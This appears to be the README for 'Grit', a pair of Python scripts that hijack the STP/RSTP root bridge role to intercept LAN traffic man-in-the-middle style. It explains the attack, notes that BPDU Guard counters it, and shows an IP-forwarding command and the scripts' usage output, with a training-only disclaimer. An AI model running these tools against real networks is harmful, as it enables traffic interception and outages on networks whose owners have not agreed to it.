# Grit
STP &amp; RSTP Root Hijacking Exploits

**The author has nothing to do with those who will use these tools for personal purposes to destroy other people's computer networks. The tools are presented for training purposes to help engineers improve the security of their network.**

## 1. Mechanics of the attack.

The basic principle of the tools is to generate an STP/RSTP frame with the lowest priority value. Which in turn allows you to intercept the role of the root switch.
After that, an opportunity will open for a MITM attack, you will partially intercept traffic, not all of it. Keep that in mind.
But don't forget that the BPDU GUARD system can stop you.

## 2. Limitations

Depending on the power of your hardware. some host traffic will go through you, you have to withstand this load, otherwise DoS will occur.

## 3. Attack

### 3.1 Routing Management

##### 3.1.1 Enable Forwarding:

```
sysctl -w net.ipv4.ip_forward
```

```
python3 stpexploit.py  --help     

  ▄████  ██▀███   ██▓▄▄▄█████▓
 ██▒ ▀█▒▓██ ▒ ██▒▓██▒▓  ██▒ ▓▒
▒██░▄▄▄░▓██ ░▄█ ▒▒██▒▒ ▓██░ ▒░
░▓█  ██▓▒██▀▀█▄  ░██░░ ▓██▓ ░ 
░▒▓███▀▒░██▓ ▒██▒░██░  ▒██▒ ░ 
 ░▒   ▒ ░ ▒▓ ░▒▓░░▓    ▒ ░░   
  ░   ░   ░▒ ░ ▒░ ▒ ░    ░    
░ ░   ░   ░░   ░  ▒ ░  ░      
      ░    ░      ░          

STP Root Hijacking Exploit
For the classic version of Spanning Tree Protocol

Author: Magama Bazarov, @in9uz, <in9uz@protonmail.com>

usage: stpexploit.py [-h] --interface INTERFACE --mac EVILMAC

options:
  -h, --help            show this help message and exit
  --interface INTERFACE
                        Choose the interface to attack
  --mac EVILMAC         Specify your MAC
```

```
python3 rstpexploit.py --help                                                                                                                          2 ↵

  ▄████  ██▀███   ██▓▄▄▄█████▓
 ██▒ ▀█▒▓██ ▒ ██▒▓██▒▓  ██▒ ▓▒
▒██░▄▄▄░▓██ ░▄█ ▒▒██▒▒ ▓██░ ▒░
░▓█  ██▓▒██▀▀█▄  ░██░░ ▓██▓ ░ 
░▒▓███▀▒░██▓ ▒██▒░██░  ▒██▒ ░ 
 ░▒   ▒ ░ ▒▓ ░▒▓░░▓    ▒ ░░   
  ░   ░   ░▒ ░ ▒░ ▒ ░    ░    
░ ░   ░   ░░   ░  ▒ ░  ░      
      ░    ░      ░          

RSTP Root Hijacking Exploit
For Rapid Spanning Tree Protocol version

Author: Magama Bazarov, @in9uz, <in9uz@protonmail.com>

usage: rstpexploit.py [-h] --interface INTERFACE --mac EVILMAC

options:
  -h, --help            show this help message and exit
  --interface INTERFACE
  --mac EVILMAC
```
